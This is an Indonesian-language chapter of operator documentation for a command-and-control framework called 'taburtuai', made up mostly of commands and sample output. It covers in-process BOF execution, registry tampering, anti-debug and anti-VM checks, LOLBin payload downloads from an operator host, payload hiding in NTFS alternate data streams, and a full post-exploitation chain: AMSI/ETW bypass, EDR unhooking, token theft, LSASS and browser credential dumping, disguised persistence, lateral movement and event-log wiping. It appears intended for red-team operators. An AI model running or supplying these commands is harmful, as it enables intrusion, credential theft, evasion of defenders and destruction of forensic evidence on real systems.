# 15 — Advanced Techniques

## BOF Execution (Beacon Object File)

**BOF (Beacon Object File)** adalah COFF object file (`.o`) yang dieksekusi secara
in-process oleh agent tanpa spawn proses baru. Format sama dengan yang dipakai Cobalt Strike.

**Keuntungan BOF:**
- Tidak ada proses baru di process list
- Bisa akses Win32 API dan syscall langsung
- Tidak perlu tulis file ke disk
- Compatible dengan ekosistem BOF yang sudah ada

### Kompilasi BOF

```bash
# Di mesin Linux dengan MinGW
x86_64-w64-mingw32-gcc -c dir.c -o dir.o -masm=intel
```

### Upload dan Eksekusi BOF

```
taburtuai(IP:8000) › files upload 2703886d ./dir.o "C:\Temp\dir.o" --wait

taburtuai(IP:8000) › bof 2703886d --file "C:\Temp\dir.o" --wait
```

**Output:**
```
[*] Loading BOF: C:\Temp\dir.o...
[*] Resolving imports...
[*] Executing in-process (no new thread)...
[+] BOF execution completed (0.4s):

[BOF output]
Listing C:\:
  PerfLogs          <DIR>
  Program Files     <DIR>
  Program Files (x86) <DIR>
  Temp              <DIR>
  Users             <DIR>
  Windows           <DIR>
```

### Eksekusi dengan Arguments

BOF bisa menerima argumen yang di-pack dalam format binary Cobalt Strike:

```bash
# Pack arguments (di mesin operator)
python3 pack_bof_args.py --string "C:\Users" > args.bin
base64 args.bin > args.b64
```

```
taburtuai(IP:8000) › bof 2703886d \
  --file "C:\Temp\dir.o" \
  --args-b64 "$(cat args.b64)" \
  --wait
```

### BOF yang Umum Dipakai

| BOF | Fungsi | Sumber |
|-----|--------|--------|
| `dir.o` | List direktori tanpa cmd | trustedsec/CS-Situational-Awareness-BOF |
| `whoami.o` | whoami tanpa spawn process | trustedsec/CS-Situational-Awareness-BOF |
| `arp.o` | ARP table | trustedsec/CS-Situational-Awareness-BOF |
| `netstat.o` | Active connections | trustedsec/CS-Situational-Awareness-BOF |
| `ldapsearch.o` | LDAP query langsung | trustedsec/CS-Situational-Awareness-BOF |
| `nanodump.o` | LSASS dump (PPL bypass) | helpsystems |
| `unhook.o` | EDR unhooking BOF | rad98/bof-collection |

---

## Registry Operations

Baca, tulis, hapus, dan enumerasi registry keys di Windows target.

### Baca Registry Value

```
taburtuai(IP:8000) › registry read 2703886d \
  --hive HKLM \
  --key "SOFTWARE\Microsoft\Windows NT\CurrentVersion" \
  --value ProductName \
  --wait
```

**Output:**
```
[+] Registry value:

    Path  : HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName
    Type  : REG_SZ
    Data  : Windows 11 Home
```

```
taburtuai(IP:8000) › registry read 2703886d \
  --hive HKLM \
  --key "SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" \
  --value EnableSecuritySignature \
  --wait
```

**Output:**
```
[+] Registry value:

    Path  : HKLM\SYSTEM\...\EnableSecuritySignature
    Type  : REG_DWORD
    Data  : 0x00000001 (1)
```

### Tulis Registry Value

```
taburtuai(IP:8000) › registry write 2703886d \
  --hive HKCU \
  --key "Software\Microsoft\Windows\CurrentVersion\Policies\System" \
  --value DisableLockWorkstation \
  --data 1 \
  --type dword \
  --wait
```

**Output:**
```
[+] Registry value written.

    Path  : HKCU\...\DisableLockWorkstation
    Type  : REG_DWORD
    Data  : 0x00000001
```

**Tipe data yang didukung:**

| Flag `--type` | Registry Type | Contoh `--data` |
|---------------|---------------|-----------------|
| `sz` | REG_SZ (string) | `"Hello World"` |
| `dword` | REG_DWORD (32-bit int) | `1` atau `0x1` |
| `qword` | REG_QWORD (64-bit int) | `1000000` |
| `binary` | REG_BINARY | `deadbeef` (hex) |
| `multi` | REG_MULTI_SZ | `val1\0val2\0val3` |
| `expand` | REG_EXPAND_SZ | `%SystemRoot%\System32` |

### Hapus Registry Value

```
taburtuai(IP:8000) › registry delete 2703886d \
  --hive HKCU \
  --key "Software\Test" \
  --value MyValue \
  --wait
```

**Output:**
```
[+] Registry value deleted: HKCU\Software\Test\MyValue
```

### Hapus Registry Key (dan Semua Subkey)

```
taburtuai(IP:8000) › registry delete 2703886d \
  --hive HKCU \
  --key "Software\Test" \
  --wait
```

**Output:**
```
[+] Registry key deleted: HKCU\Software\Test (dan semua isinya)
```

### List Subkeys dan Values

```
taburtuai(IP:8000) › registry list 2703886d \
  --hive HKLM \
  --key "SOFTWARE\Microsoft\Windows\CurrentVersion\Run" \
  --wait
```

**Output:**
```
[+] Registry contents:

HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
│
├── [VALUE] SecurityHealth        REG_SZ  C:\Windows\system32\SecurityHealthSystray.exe
├── [VALUE] OneDrive              REG_SZ  "C:\Program Files\Microsoft OneDrive\OneDrive.exe"
├── [VALUE] MicrosoftEdgeUpdate   REG_SZ  C:\Program Files\Microsoft\Edge\Application\msedge.exe
└── [VALUE] WindowsSecurityUpdate REG_SZ  C:\Users\john.doe\AppData\Roaming\ws_update.exe
```

---

## Anti-Debug Check

Deteksi apakah agent berjalan di dalam debugger atau environment analisis.

```
taburtuai(IP:8000) › opsec antidebug 2703886d --wait
```

**Output (tidak di-debug):**
```
[+] Anti-debug checks completed:

    IsDebuggerPresent       : FALSE ✓
    CheckRemoteDebugger     : FALSE ✓
    NtQueryInformationProcess: No debugger ✓
    Heap flags              : Normal ✓
    
[+] CLEAR — tidak terdeteksi debugger aktif.
```

**Output (ada debugger):**
```
[+] Anti-debug checks completed:

    IsDebuggerPresent       : TRUE  ✗  [ALERT]
    CheckRemoteDebugger     : TRUE  ✗  [ALERT]
    
[!] ALERT — Debugger terdeteksi! Rekomendasi: hentikan operasi.
```

---

## Anti-VM Check

Deteksi apakah agent berjalan di dalam virtual machine atau sandbox.

```
taburtuai(IP:8000) › opsec antivm 2703886d --wait
```

**Output (bukan VM):**
```
[+] Anti-VM checks completed:

    CPUID hypervisor bit     : FALSE ✓
    VMWare registry artifacts: Not found ✓
    VirtualBox drivers       : Not found ✓
    Hyper-V artifacts        : Not found ✓
    VM-typical processes     : Not found ✓
    MAC address vendors      : Normal (not virtualization vendor) ✓
    Disk model               : Normal ✓

[+] CLEAR — tidak terdeteksi virtual machine.
```

**Output (berjalan di VM):**
```
[+] Anti-VM checks completed:

    CPUID hypervisor bit     : TRUE  ✗  [ALERT]
    VMWare registry artifacts: Found (VMware, Inc.) ✗  [ALERT]
    VM-typical processes     : vmtoolsd.exe, vmwaretray.exe ✗  [ALERT]

[!] ALERT — Virtual machine terdeteksi (VMware)!
[i] Kemungkinan berjalan di sandbox atau analyst machine.
```

---

## Timegate (Working Hours + Kill Date Runtime)

Konfigurasi jam kerja dan kill date secara runtime (tanpa rebuild agent).

### Set Working Hours

Agent hanya aktif beacon pada jam tertentu — di luar jam tersebut agent tidur.

```
taburtuai(IP:8000) › opsec timegate 2703886d \
  --work-start 8 \
  --work-end 18 \
  --wait
```

**Output:**
```
[*] Configuring timegate on agent 2703886d...
[+] Timegate configured.

    Active hours: 08:00 - 18:00 (local time of target machine)
    Timezone    : DESKTOP-QLPBF95 local time
    
[i] Agent akan tidur di luar jam 08:00-18:00 dan tidak mengirim beacon.
[i] Ini mencegah anomali traffic C2 di luar jam kerja normal.
```

### Set Kill Date Runtime

```
taburtuai(IP:8000) › opsec timegate 2703886d \
  --kill-date 2026-05-31 \
  --wait
```

**Output:**
```
[+] Kill date set: 2026-05-31

[i] Agent akan berhenti otomatis setelah tanggal tersebut.
[i] Tidak ada cara untuk membatalkan kill date setelah di-set tanpa rebuild.
```

### Set Keduanya Sekaligus

```
taburtuai(IP:8000) › opsec timegate 2703886d \
  --work-start 9 \
  --work-end 17 \
  --kill-date 2026-06-30 \
  --wait
```

---

## LOLBin File Fetch

Download file menggunakan binary Windows yang sudah ada (Living-off-the-Land).
Tidak perlu upload tool download — pakai yang sudah ada di system.

### certutil (Default)

```
taburtuai(IP:8000) › lolbin fetch 2703886d \
  --url http://10.10.5.3/tool.exe \
  --dest "C:\Temp\tool.exe" \
  --method certutil \
  --wait
```

**Output:**
```
[*] Fetching http://10.10.5.3/tool.exe via certutil...
[+] Download completed (2.3s).

    Source : http://10.10.5.3/tool.exe
    Dest   : C:\Temp\tool.exe
    Size   : 1,245,184 bytes
    Method : certutil -urlcache -split -f
```

### bitsadmin

```
taburtuai(IP:8000) › lolbin fetch 2703886d \
  --url http://10.10.5.3/payload.exe \
  --dest "C:\Users\Public\payload.exe" \
  --method bitsadmin \
  --wait
```

### PowerShell (WebClient/Invoke-WebRequest)

```
taburtuai(IP:8000) › lolbin fetch 2703886d \
  --url https://10.10.5.3/script.ps1 \
  --dest "C:\Temp\script.ps1" \
  --method powershell \
  --wait
```

### curl.exe (Windows 10+)

```
taburtuai(IP:8000) › lolbin fetch 2703886d \
  --url http://10.10.5.3/data.bin \
  --dest "C:\Temp\data.bin" \
  --method curl \
  --timeout 120 \
  --wait
```

---

## ADS Exec (Alternate Data Stream)

Sembunyikan dan eksekusi payload di Alternate Data Stream NTFS.

### Tulis ke ADS

```
taburtuai(IP:8000) › files upload 2703886d ./payload.js "C:\Windows\System32\drivers\null.sys:p.js" --wait
# [+] ADS stream written: C:\Windows\...\null.sys:p.js
```

### Eksekusi dari ADS

```
taburtuai(IP:8000) › ads exec 2703886d \
  --ads-path "C:\Windows\System32\drivers\null.sys:p.js" \
  --wait
```

**Output:**
```
[*] Executing ADS via wscript.exe...
[+] ADS exec completed.
```

---

## Skenario: Post-Exploitation Lengkap

```
# ── 1. Situational Awareness ──────────────────────────────
opsec antidebug 2703886d --wait
opsec antivm    2703886d --wait

# ── 2. Evasion ────────────────────────────────────────────
bypass amsi   2703886d --wait
bypass etw    2703886d --wait
evasion unhook 2703886d --wait
evasion sleep  2703886d --duration 60 --wait

# ── 3. Privilege Check dan Escalation ─────────────────────
cmd 2703886d "whoami /priv"
token list 2703886d --wait
token steal 2703886d --pid 724 --wait   # impersonate SYSTEM

# ── 4. Credential Access ──────────────────────────────────
creds lsass 2703886d --output "C:\Temp\w.dmp" --wait
files download 2703886d "C:\Temp\w.dmp" ./loot/lsass.dmp --timeout 120 --wait
files delete 2703886d "C:\Temp\w.dmp" --wait
creds browser 2703886d --wait

# ── 5. Persistence ────────────────────────────────────────
persistence setup 2703886d --method service --name "WinHTTPSvc" --wait
persistence setup 2703886d --method schtask --name "OneDriveUpdate" --trigger logon --wait

# ── 6. Lateral Movement ───────────────────────────────────
netscan 2703886d --targets 192.168.1.0/24 --ports 445,3389,5985 --wait
socks5 start 2703886d --wait
# Dari operator: proxychains psexec ke host lain

# ── 7. Timegate (OPSEC) ───────────────────────────────────
opsec timegate 2703886d --work-start 8 --work-end 18 --kill-date 2026-06-30 --wait

# ── 8. Cover Tracks ───────────────────────────────────────
cmd 2703886d "wevtutil cl System" --wait
cmd 2703886d "wevtutil cl Security" --wait
cmd 2703886d "wevtutil cl Application" --wait
```

---

**Selanjutnya:** [16 — Red Team Scenarios](16-scenarios.md)
